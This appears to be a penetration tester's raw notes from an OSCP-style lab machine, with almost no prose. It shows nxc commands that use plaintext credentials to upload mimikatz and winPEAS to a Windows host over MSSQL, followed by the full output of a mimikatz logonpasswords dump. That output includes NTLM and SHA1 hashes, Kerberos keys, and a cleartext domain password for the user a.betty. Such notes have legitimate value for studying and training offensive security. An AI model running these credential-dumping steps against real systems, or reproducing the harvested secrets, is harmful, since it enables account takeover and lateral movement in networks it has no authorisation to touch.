
proof
9e0760382b10babe9219fc1a03e1636c
![[{1EB97335-87BA-4A62-AA8A-D6FDC32E305D}.png]]


![[{59AAB231-29E7-4EC9-BAFB-2A1E83CE04F5}.png]]

users are a.betty
jenkins 

![[{2D352468-3602-4240-95B2-FFF7769B6763}.png]]


 nxc mssql 172.16.114.202 -u hacker -p 'Password123!' --put-file winPEASx64..exe C:\Users\administrator\Downloads\winPEASx64.exe                                                                                 
└─$ nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' --put-file mimikatz.exe C:\\Users\\Public\\mimikatz.exe                                                                                     

```
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hacker\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 106859 (00000000:0001a16b)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:16 AM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
        msv :
         [00000003] Primary
         * Username : SRV22$
         * Domain   : OSCP
         * NTLM     : a100f6c064ca507f047ba9429702c7d0
         * SHA1     : a1fb6e93f2a0f772e87de49993fa0101ae619594
        tspkg :
        wdigest :
         * Username : SRV22$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : SRV22$
         * Domain   : oscp.exam
         * Password : 1c fc 6a 16 03 fb 68 4c d9 7e ba 2d 6a 3d ed cc d7 d2 1f f8 16 4e 61 cb 34 83 ec 7c 11 f8 02 62 a0 28 f7 40 eb 00 5f 0c 80 fd a1 72 6e b5 ad 22 a1 1f 6f 57 a1 d8 42 f2 2b 29 5b 63 cd a6 b3 76 3b 03 4a 50 12 69 ad a6 6b 62 64 0b bf 84 ec fd 1a a9 bf ee a9 eb c7 65 c1 1d 9e e7 ea 75 20 76 c2 08 31 89 a9 c7 3b dd 97 de cd 5f 89 88 ef a0 45 5d f4 ee 6e 2f 1c 6f 21 46 63 29 44 ce 02 98 38 ac a0 a0 30 a5 a6 41 f8 13 56 53 fa da a6 fd 24 ff 51 a5 34 e6 6c 61 54 e0 6e 65 77 e2 3a c4 cd 7b 49 b0 1a b3 54 ae c8 ba 13 98 b3 d9 81 8a 41 8c ca 8d ab f9 14 44 70 fe ca 38 cc b2 05 7a 74 f9 61 20 a1 1d 7d 82 29 c3 2c 7b 66 4e cc 43 e6 c7 9c b5 0a 87 4e 30 aa 76 ac ed 44 4c 6a 52 71 1a c2 7c 2a a6 de 24 63 d5 9b 87 c0 84 cf a4
        ssp :
        credman :

Authentication Id : 0 ; 68136 (00000000:00010a28)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:15 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SRV22$
         * Domain   : OSCP
         * NTLM     : a100f6c064ca507f047ba9429702c7d0
         * SHA1     : a1fb6e93f2a0f772e87de49993fa0101ae619594
        tspkg :
        wdigest :
         * Username : SRV22$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : SRV22$
         * Domain   : oscp.exam
         * Password : 1c fc 6a 16 03 fb 68 4c d9 7e ba 2d 6a 3d ed cc d7 d2 1f f8 16 4e 61 cb 34 83 ec 7c 11 f8 02 62 a0 28 f7 40 eb 00 5f 0c 80 fd a1 72 6e b5 ad 22 a1 1f 6f 57 a1 d8 42 f2 2b 29 5b 63 cd a6 b3 76 3b 03 4a 50 12 69 ad a6 6b 62 64 0b bf 84 ec fd 1a a9 bf ee a9 eb c7 65 c1 1d 9e e7 ea 75 20 76 c2 08 31 89 a9 c7 3b dd 97 de cd 5f 89 88 ef a0 45 5d f4 ee 6e 2f 1c 6f 21 46 63 29 44 ce 02 98 38 ac a0 a0 30 a5 a6 41 f8 13 56 53 fa da a6 fd 24 ff 51 a5 34 e6 6c 61 54 e0 6e 65 77 e2 3a c4 cd 7b 49 b0 1a b3 54 ae c8 ba 13 98 b3 d9 81 8a 41 8c ca 8d ab f9 14 44 70 fe ca 38 cc b2 05 7a 74 f9 61 20 a1 1d 7d 82 29 c3 2c 7b 66 4e cc 43 e6 c7 9c b5 0a 87 4e 30 aa 76 ac ed 44 4c 6a 52 71 1a c2 7c 2a a6 de 24 63 d5 9b 87 c0 84 cf a4
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SRV22$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:15 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SRV22$
         * Domain   : OSCP
         * NTLM     : a100f6c064ca507f047ba9429702c7d0
         * SHA1     : a1fb6e93f2a0f772e87de49993fa0101ae619594
        tspkg :
        wdigest :
         * Username : SRV22$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : srv22$
         * Domain   : OSCP.EXAM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 37913 (00000000:00009419)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:14 AM
SID               :
        msv :
         [00000003] Primary
         * Username : SRV22$
         * Domain   : OSCP
         * NTLM     : a100f6c064ca507f047ba9429702c7d0
         * SHA1     : a1fb6e93f2a0f772e87de49993fa0101ae619594
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 215918 (00000000:00034b6e)
Session           : Service from 0
User Name         : SQLSERVERAGENT
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:32 AM
SID               : S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430
        msv :
         [00000003] Primary
         * Username : SRV22$
         * Domain   : OSCP
         * NTLM     : a100f6c064ca507f047ba9429702c7d0
         * SHA1     : a1fb6e93f2a0f772e87de49993fa0101ae619594
        tspkg :
        wdigest :
         * Username : SRV22$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : SRV22$
         * Domain   : oscp.exam
         * Password : 1c fc 6a 16 03 fb 68 4c d9 7e ba 2d 6a 3d ed cc d7 d2 1f f8 16 4e 61 cb 34 83 ec 7c 11 f8 02 62 a0 28 f7 40 eb 00 5f 0c 80 fd a1 72 6e b5 ad 22 a1 1f 6f 57 a1 d8 42 f2 2b 29 5b 63 cd a6 b3 76 3b 03 4a 50 12 69 ad a6 6b 62 64 0b bf 84 ec fd 1a a9 bf ee a9 eb c7 65 c1 1d 9e e7 ea 75 20 76 c2 08 31 89 a9 c7 3b dd 97 de cd 5f 89 88 ef a0 45 5d f4 ee 6e 2f 1c 6f 21 46 63 29 44 ce 02 98 38 ac a0 a0 30 a5 a6 41 f8 13 56 53 fa da a6 fd 24 ff 51 a5 34 e6 6c 61 54 e0 6e 65 77 e2 3a c4 cd 7b 49 b0 1a b3 54 ae c8 ba 13 98 b3 d9 81 8a 41 8c ca 8d ab f9 14 44 70 fe ca 38 cc b2 05 7a 74 f9 61 20 a1 1d 7d 82 29 c3 2c 7b 66 4e cc 43 e6 c7 9c b5 0a 87 4e 30 aa 76 ac ed 44 4c 6a 52 71 1a c2 7c 2a a6 de 24 63 d5 9b 87 c0 84 cf a4
        ssp :
        credman :

Authentication Id : 0 ; 184902 (00000000:0002d246)
Session           : Service from 0
User Name         : a.betty
Domain            : OSCP
Logon Server      : DC20
Logon Time        : 11/12/2024 5:13:28 AM
SID               : S-1-5-21-2468442526-2906141135-4054829294-1103
        msv :
         [00000003] Primary
         * Username : a.betty
         * Domain   : OSCP
         * NTLM     : 1e7650d56ca3ab18bdea7a737c4a7f02
         * SHA1     : bf54d1130b9e0183a8192951743dcd62c3b58800
         * DPAPI    : e7841615bc3259308c63da3a8b5cc3a6
        tspkg :
        wdigest :
         * Username : a.betty
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : a.betty
         * Domain   : OSCP.EXAM
         * Password : BrightSunnyDay666
        ssp :
        credman :

Authentication Id : 0 ; 106717 (00000000:0001a0dd)
Session           : Service from 0
User Name         : MSSQLSERVER
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:16 AM
SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
        msv :
         [00000003] Primary
         * Username : SRV22$
         * Domain   : OSCP
         * NTLM     : a100f6c064ca507f047ba9429702c7d0
         * SHA1     : a1fb6e93f2a0f772e87de49993fa0101ae619594
        tspkg :
        wdigest :
         * Username : SRV22$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : SRV22$
         * Domain   : oscp.exam
         * Password : 1c fc 6a 16 03 fb 68 4c d9 7e ba 2d 6a 3d ed cc d7 d2 1f f8 16 4e 61 cb 34 83 ec 7c 11 f8 02 62 a0 28 f7 40 eb 00 5f 0c 80 fd a1 72 6e b5 ad 22 a1 1f 6f 57 a1 d8 42 f2 2b 29 5b 63 cd a6 b3 76 3b 03 4a 50 12 69 ad a6 6b 62 64 0b bf 84 ec fd 1a a9 bf ee a9 eb c7 65 c1 1d 9e e7 ea 75 20 76 c2 08 31 89 a9 c7 3b dd 97 de cd 5f 89 88 ef a0 45 5d f4 ee 6e 2f 1c 6f 21 46 63 29 44 ce 02 98 38 ac a0 a0 30 a5 a6 41 f8 13 56 53 fa da a6 fd 24 ff 51 a5 34 e6 6c 61 54 e0 6e 65 77 e2 3a c4 cd 7b 49 b0 1a b3 54 ae c8 ba 13 98 b3 d9 81 8a 41 8c ca 8d ab f9 14 44 70 fe ca 38 cc b2 05 7a 74 f9 61 20 a1 1d 7d 82 29 c3 2c 7b 66 4e cc 43 e6 c7 9c b5 0a 87 4e 30 aa 76 ac ed 44 4c 6a 52 71 1a c2 7c 2a a6 de 24 63 d5 9b 87 c0 84 cf a4
        ssp :
        credman :

Authentication Id : 0 ; 104946 (00000000:000199f2)
Session           : Service from 0
User Name         : jenkins
Domain            : SRV22
Logon Server      : SRV22
Logon Time        : 11/12/2024 5:13:16 AM
SID               : S-1-5-21-1471699165-2210101194-1814576434-1002
        msv :
         [00000003] Primary
         * Username : jenkins
         * Domain   : SRV22
         * NTLM     : 9b96df9153746d2f58a9623742f13aa0
         * SHA1     : 2299853c797cfc781d890b28ad84cfaf18057260
        tspkg :
        wdigest :
         * Username : jenkins
         * Domain   : SRV22
         * Password : (null)
        kerberos :
         * Username : jenkins
         * Domain   : SRV22
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:15 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 39171 (00000000:00009903)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:15 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : SRV22$
         * Domain   : OSCP
         * NTLM     : a100f6c064ca507f047ba9429702c7d0
         * SHA1     : a1fb6e93f2a0f772e87de49993fa0101ae619594
        tspkg :
        wdigest :
         * Username : SRV22$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : SRV22$
         * Domain   : oscp.exam
         * Password : 1c fc 6a 16 03 fb 68 4c d9 7e ba 2d 6a 3d ed cc d7 d2 1f f8 16 4e 61 cb 34 83 ec 7c 11 f8 02 62 a0 28 f7 40 eb 00 5f 0c 80 fd a1 72 6e b5 ad 22 a1 1f 6f 57 a1 d8 42 f2 2b 29 5b 63 cd a6 b3 76 3b 03 4a 50 12 69 ad a6 6b 62 64 0b bf 84 ec fd 1a a9 bf ee a9 eb c7 65 c1 1d 9e e7 ea 75 20 76 c2 08 31 89 a9 c7 3b dd 97 de cd 5f 89 88 ef a0 45 5d f4 ee 6e 2f 1c 6f 21 46 63 29 44 ce 02 98 38 ac a0 a0 30 a5 a6 41 f8 13 56 53 fa da a6 fd 24 ff 51 a5 34 e6 6c 61 54 e0 6e 65 77 e2 3a c4 cd 7b 49 b0 1a b3 54 ae c8 ba 13 98 b3 d9 81 8a 41 8c ca 8d ab f9 14 44 70 fe ca 38 cc b2 05 7a 74 f9 61 20 a1 1d 7d 82 29 c3 2c 7b 66 4e cc 43 e6 c7 9c b5 0a 87 4e 30 aa 76 ac ed 44 4c 6a 52 71 1a c2 7c 2a a6 de 24 63 d5 9b 87 c0 84 cf a4
        ssp :
        credman :

Authentication Id : 0 ; 39064 (00000000:00009898)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:14 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : SRV22$
         * Domain   : OSCP
         * NTLM     : a100f6c064ca507f047ba9429702c7d0
         * SHA1     : a1fb6e93f2a0f772e87de49993fa0101ae619594
        tspkg :
        wdigest :
         * Username : SRV22$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : SRV22$
         * Domain   : oscp.exam
         * Password : 1c fc 6a 16 03 fb 68 4c d9 7e ba 2d 6a 3d ed cc d7 d2 1f f8 16 4e 61 cb 34 83 ec 7c 11 f8 02 62 a0 28 f7 40 eb 00 5f 0c 80 fd a1 72 6e b5 ad 22 a1 1f 6f 57 a1 d8 42 f2 2b 29 5b 63 cd a6 b3 76 3b 03 4a 50 12 69 ad a6 6b 62 64 0b bf 84 ec fd 1a a9 bf ee a9 eb c7 65 c1 1d 9e e7 ea 75 20 76 c2 08 31 89 a9 c7 3b dd 97 de cd 5f 89 88 ef a0 45 5d f4 ee 6e 2f 1c 6f 21 46 63 29 44 ce 02 98 38 ac a0 a0 30 a5 a6 41 f8 13 56 53 fa da a6 fd 24 ff 51 a5 34 e6 6c 61 54 e0 6e 65 77 e2 3a c4 cd 7b 49 b0 1a b3 54 ae c8 ba 13 98 b3 d9 81 8a 41 8c ca 8d ab f9 14 44 70 fe ca 38 cc b2 05 7a 74 f9 61 20 a1 1d 7d 82 29 c3 2c 7b 66 4e cc 43 e6 c7 9c b5 0a 87 4e 30 aa 76 ac ed 44 4c 6a 52 71 1a c2 7c 2a a6 de 24 63 d5 9b 87 c0 84 cf a4
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SRV22$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 11/12/2024 5:13:14 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SRV22$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : srv22$
         * Domain   : OSCP.EXAM
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!

```

         * Username : a.betty
         * Domain   : OSCP.EXAM
         * Password : BrightSunnyDay666
     * 